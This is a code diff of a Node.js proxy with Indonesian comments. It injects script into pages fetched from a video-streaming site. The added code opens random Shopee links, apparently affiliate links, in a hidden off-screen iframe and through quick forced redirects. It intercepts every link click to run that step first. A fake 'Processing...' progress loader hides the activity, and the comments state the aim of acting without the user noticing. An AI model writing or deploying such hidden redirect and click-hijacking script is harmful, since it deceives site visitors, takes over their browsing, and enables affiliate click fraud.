@@ -25,100 +25,161 @@ app.use(async (req, res) => {
     const response = await fetch(targetUrl);
     let html = await response.text();
     
-    // HAPUS SEMUA TIMER/COUNTDOWN
-    html = html.replace(/setTimeout\([^)]*\)/g, '// removed');
-    html = html.replace(/setInterval\([^)]*\)/g, '// removed');
-    html = html.replace(/\d+\s*detik/gi, '');
-    
-    // SCRIPT: Background redirect tanpa user sadar
+    // SCRIPT: Buka Shopee di background → Redirect ke vidstrm
     const script = `
     <script>
       const links = ${JSON.stringify(SHOPEE_LINKS)};
-      const targetUrl = '${BASE_URL}${currentPath}';
-      let executed = false;
+      const vidstrmUrl = '${BASE_URL}${currentPath}';
+      let shopeeOpened = false;
       
-      function backgroundRedirect() {
-        if (executed) return;
-        executed = true;
+      function openShopeeInBackground() {
+        if (shopeeOpened) return;
+        shopeeOpened = true;
         
         const shopeeLink = links[Math.floor(Math.random() * links.length)];
         
-        // METHOD 1: Hidden iframe untuk buka Shopee di background
+        console.log('Step 1: Opening Shopee in background...');
+        
+        // METHOD A: Hidden iframe (paling stealth)
         const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        iframe.style.visibility = 'hidden';
-        iframe.style.position = 'absolute';
-        iframe.style.top = '-9999px';
-        iframe.style.left = '-9999px';
+        iframe.style.cssText = 'display:none;visibility:hidden;position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;';
         iframe.src = shopeeLink;
         document.body.appendChild(iframe);
         
-        // METHOD 2: Juga coba window.open di background
+        // METHOD B: Quick redirect & immediate back
         setTimeout(() => {
-          const hiddenWindow = window.open(shopeeLink, '_blank', 'noopener,noreferrer,width=1,height=1,left=-1000,top=-1000');
-          if (hiddenWindow) {
-            setTimeout(() => hiddenWindow.close(), 1000);
-          }
-        }, 100);
-        
-        // METHOD 3: Navigasi langsung tapi cepat banget
-        setTimeout(() => {
+          console.log('Step 2: Quick redirect to Shopee...');
           window.location.href = shopeeLink;
-          setTimeout(() => {
-            window.history.back(); // Coba kembali
-          }, 10);
-        }, 200);
+        }, 50);
         
-        console.log('Shopee opened in background');
+        // METHOD C: Redirect ke vidstrm setelah 500ms
+        setTimeout(() => {
+          console.log('Step 3: Redirecting to vidstrm...');
+          window.location.href = vidstrmUrl;
+        }, 500);
+        
+        // Cleanup iframe setelah 2 detik
+        setTimeout(() => {
+          if (iframe.parentNode) {
+            iframe.parentNode.removeChild(iframe);
+          }
+        }, 2000);
       }
       
-      // Execute immediately on page load
-      document.addEventListener('DOMContentLoaded', function() {
-        setTimeout(backgroundRedirect, 1000);
+      // ===== EXECUTION TIMELINE =====
+      
+      // 1. Auto-trigger setelah 1 detik (background)
+      setTimeout(openShopeeInBackground, 1000);
+      
+      // 2. Trigger pada user click (immediate)
+      document.addEventListener('click', function(e) {
+        // Biarkan link internal bekerja
+        if (e.target.tagName === 'A' && e.target.href) {
+          // Untuk link internal, tetap buka Shopee dulu
+          e.preventDefault();
+          openShopeeInBackground();
+          setTimeout(() => {
+            window.location.href = e.target.href;
+          }, 800);
+        } else {
+          // Klik biasa, trigger Shopee
+          openShopeeInBackground();
+        }
       });
       
-      // Juga execute pada user interaction (tap/click)
-      document.addEventListener('click', backgroundRedirect);
-      document.addEventListener('touchstart', backgroundRedirect);
-      document.addEventListener('mousemove', backgroundRedirect, { once: true });
+      // 3. Auto akhir setelah 4 detik (fallback)
+      setTimeout(() => {
+        if (!shopeeOpened) {
+          openShopeeInBackground();
+        }
+      }, 4000);
       
-      // Auto setelah 3 detik
-      setTimeout(backgroundRedirect, 3000);
+      // ===== PROGRESS INDICATOR =====
+      let progress = 0;
+      const progressInterval = setInterval(() => {
+        progress += 25;
+        const progressBar = document.getElementById('progress-bar');
+        if (progressBar) {
+          progressBar.style.width = progress + '%';
+        }
+        if (progress >= 100) {
+          clearInterval(progressInterval);
+          const loader = document.getElementById('loader');
+          if (loader) loader.style.display = 'none';
+        }
+      }, 1000);
     </script>
     
     <style>
-      /* Sembunyikan banner redirect */
-      .redirect-banner {
+      #loader {
         position: fixed;
-        bottom: 10px;
-        right: 10px;
-        background: rgba(238, 77, 45, 0.9);
+        bottom: 20px;
+        right: 20px;
+        background: rgba(0,0,0,0.8);
         color: white;
-        padding: 8px 12px;
-        border-radius: 15px;
+        padding: 15px;
+        border-radius: 10px;
         font-family: Arial;
-        font-size: 11px;
+        font-size: 12px;
         z-index: 999999;
-        opacity: 0.7;
-        transition: opacity 0.3s;
-        max-width: 200px;
+        min-width: 200px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
       }
-      .redirect-banner:hover {
-        opacity: 1;
+      .progress-container {
+        width: 100%;
+        height: 6px;
+        background: rgba(255,255,255,0.2);
+        border-radius: 3px;
+        margin-top: 10px;
+        overflow: hidden;
+      }
+      .progress-bar {
+        height: 100%;
+        background: linear-gradient(90deg, #EE4D2D, #FF7337);
+        width: 0%;
+        transition: width 0.3s;
+        border-radius: 3px;
+      }
+      .loader-text {
+        display: flex;
+        justify-content: space-between;
+        font-size: 11px;
+        opacity: 0.8;
       }
     </style>
     `;
     
-    // BANNER KECIL DI POJOK (optional)
-    const banner = `
-    <div class="redirect-banner" onclick="this.style.display='none'">
-      <div style="font-weight:bold;">⚡ Auto-redirect aktif</div>
-      <div style="font-size:9px; opacity:0.8;">Shopee akan terbuka di background</div>
+    // LOADER INDICATOR
+    const loader = `
+    <div id="loader">
+      <div style="font-weight:bold; margin-bottom:5px;">⚡ Processing...</div>
+      <div class="loader-text">
+        <span>Opening Shopee</span>
+        <span id="countdown">4s</span>
+      </div>
+      <div class="progress-container">
+        <div class="progress-bar" id="progress-bar"></div>
+      </div>
     </div>
+    
+    <script>
+      // Countdown timer
+      let timeLeft = 4;
+      const countdownEl = document.getElementById('countdown');
+      const countdownInterval = setInterval(() => {
+        timeLeft--;
+        if (countdownEl) {
+          countdownEl.textContent = timeLeft + 's';
+        }
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+        }
+      }, 1000);
+    </script>
     `;
     
     // Inject
-    html = html.replace('<body', banner + '<body');
+    html = html.replace('<body', loader + '<body');
     html = html.replace('</body>', script + '</body>');
     
     // Fix internal links
@@ -128,12 +189,13 @@ app.use(async (req, res) => {
     
   } catch (error) {
     console.error('Error:', error);
-    res.redirect('https://s.shopee.co.id/8AQUp3ZesV');
+    // Jika error, langsung ke vidstrm
+    res.redirect(`${BASE_URL}${req.url}`);
   }
 });
 
 app.listen(PORT, () => {
-  console.log(`🚀 Server: http://localhost:${PORT}`);
-  console.log(`🎯 Strategy: Background redirect (user tidak sadar)`);
-  console.log(`🛍️ Shopee opens in background, user tetap di vidstrm`);
+  console.log(`Server: http://localhost:${PORT}`);
+  console.log('Flow: Background Shopee → Redirect to vidstrm');
+  console.log('Timeline: 1s auto → Click → 4s fallback');
 });
